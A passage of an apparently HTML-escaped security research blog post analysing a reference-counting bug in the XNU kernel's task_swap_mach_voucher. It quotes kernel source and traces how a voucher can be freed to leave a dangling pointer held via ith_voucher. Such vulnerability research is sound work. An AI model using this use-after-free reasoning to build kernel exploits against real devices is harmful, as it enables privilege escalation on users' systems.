    &lt;span class=&quot;mi&quot;&gt;4839&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;new_voucher&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;convert_port_to_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;In0P&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4840&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;4841&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;old_voucher&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;convert_port_to_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;In0P&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4842&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;4843&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;RetCode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_swap_mach_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4844&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;ipc_voucher_release&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4845&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;task_deallocate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4846&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RetCode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4847&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;MIG_RETURN_ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OutP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RetCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4848&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4849&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;__MigKernelSpecificCode&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4850&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;4851&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP_VALID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;In0P&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4852&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;ipc_port_release_send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;In0P&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4853&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;4854&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP_VALID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;In0P&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4855&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;ipc_port_release_send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;In0P&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4856&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* __MigKernelSpecificCode */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4857&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;OutP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;convert_voucher_to_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4858&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;4859&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Here are the reference count changes.&lt;/p&gt;

&lt;pre&gt;	**Line 4839: Reference count of new_voucher + 1**

	**Line 4841: Reference count of old_voucher + 1**

	**Line 4843: task_swap_mach_voucher called -&amp;gt; old_voucher = new_voucher**

	**Line 4844: Reference count of new_voucher - 1**

	**Line 4857: Reference count of new_voucher - 1 (Because old_voucher is now new_voucher)**

&lt;/pre&gt;

&lt;p&gt;I think you are starting to see the problem here. The reference count of &lt;strong&gt;new_voucher&lt;/strong&gt; can be reduced to 0 thereby freeing the object. And the reference count of &lt;strong&gt;old_voucher&lt;/strong&gt; can be increased by too many. As discussed before, the reference count overflow has been protected by the max cap value of &lt;strong&gt;0x0fffffff&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;So it is possible to get a dangling pointer pointing to a voucher. This can be done by storing a pointer to the voucher, and then using the vulnerability to reduce the reference count of the voucher to 0, which will free the voucher.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/11b.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;about-vouchers&quot;&gt;About Vouchers&lt;/h3&gt;

&lt;p&gt;Before proceeding, it is always good idea to look at the object struct and understand the different fields in it.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;63&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*
    64:  * IPC Voucher
    65:  *
    66:  * Vouchers are a reference counted immutable (once-created) set of
    67:  * indexes to particular resource manager attribute values
    68:  * (which themselves are reference counted).
    69:  */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;70&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_voucher&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;71&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;iv_index_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;iv_hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* checksum hash */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;iv_index_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;iv_sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* checksum of values */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;os_refcnt_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;iv_refs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* reference count */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;74&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;iv_index_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;iv_table_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* size of the voucher table */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;75&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;iv_index_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;iv_inline_table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IV_ENTRIES_INLINE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;76&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;iv_entry_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;iv_table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* table of voucher attr entries */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;iv_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* port representing the voucher */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;78&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;queue_chain_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;iv_hash_link&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* link on hash chain */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;79&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;So the first thing is to identify which object to store the pointer for the freed voucher in. The best way for this is to search for &lt;strong&gt;ipc_voucher_t&lt;/strong&gt; in the kernel source, and look for APIs that easily allow getting and setting of that pointer. One of the places which stands out is in the thread object inside &lt;strong&gt;osfmk/kern/thread.h&lt;/strong&gt; which stores the voucher reference with the name &lt;strong&gt;ith_voucher&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BUILD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXPORT_HDRS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kern&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;570&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CONFIG_EMBEDDED&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;571&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;task_watch_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;taskwatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* task watch */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;572&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* CONFIG_EMBEDDED */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;573&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;574&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;thread_callout_interrupt_wakeups&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;575&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;thread_callout_platform_idle_wakeups&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;576&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;thread_timer_wakeups_bin_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;577&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;thread_timer_wakeups_bin_2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;578&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;kt&quot;&gt;uint16_t&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;thread_tag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;579&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;kt&quot;&gt;uint16_t&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;callout_woken_from_icontext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;580&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 					&lt;span class=&quot;n&quot;&gt;callout_woken_from_platform_idle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;581&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 					&lt;span class=&quot;n&quot;&gt;callout_woke_thread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;582&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 					&lt;span class=&quot;n&quot;&gt;thread_bitfield_unused&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;583&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;584&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;ith_voucher_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;585&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;ipc_voucher_t&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;ith_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;586&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CONFIG_IOSCHED&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;587&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; 				&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decmp_upl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;588&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* CONFIG_IOSCHED */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;589&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The functions &lt;strong&gt;thread_get_mach_voucher&lt;/strong&gt; and &lt;strong&gt;thread_set_mach_voucher&lt;/strong&gt; can be used to read and write the voucher reference from userland. Again, as we recall from part 1, we need to look at the &lt;strong&gt;MIG&lt;/strong&gt; generated code for this function.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BUILD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RELEASE_X86_64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RELEASE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;thread_act_server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2597&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Routine thread_get_mach_voucher */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2598&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mig_internal&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;novalue&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_Xthread_get_mach_voucher&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2599&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InHeadP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OutHeadP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2600&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2601&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;2602&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifdef&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;__MigPackStructs&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2603&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pragma&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;2604&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt;
